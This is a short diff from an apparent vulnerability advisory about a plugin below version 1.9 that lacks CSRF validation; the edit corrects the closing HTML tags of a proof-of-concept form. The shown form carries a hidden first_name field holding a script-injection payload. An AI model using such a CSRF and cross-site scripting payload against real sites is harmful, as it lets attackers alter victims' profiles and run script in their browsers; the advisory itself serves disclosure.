@@ -141,9 +141,9 @@ The plugin which are using less than 1.9, these lacks CSRF validation, allowing 
 <input type="hidden" name="first_name" value='"><script>alert(`XSS`)</script>'>
 <input type="hidden" name="last_name" value="test">  
 <input type="hidden" name="nickname" value="test">  
-<form\> 
-<body\>
-<html\>
+</form> 
+</body>
+</html>
 ```
 
 **ATTACK IMPACT :** 
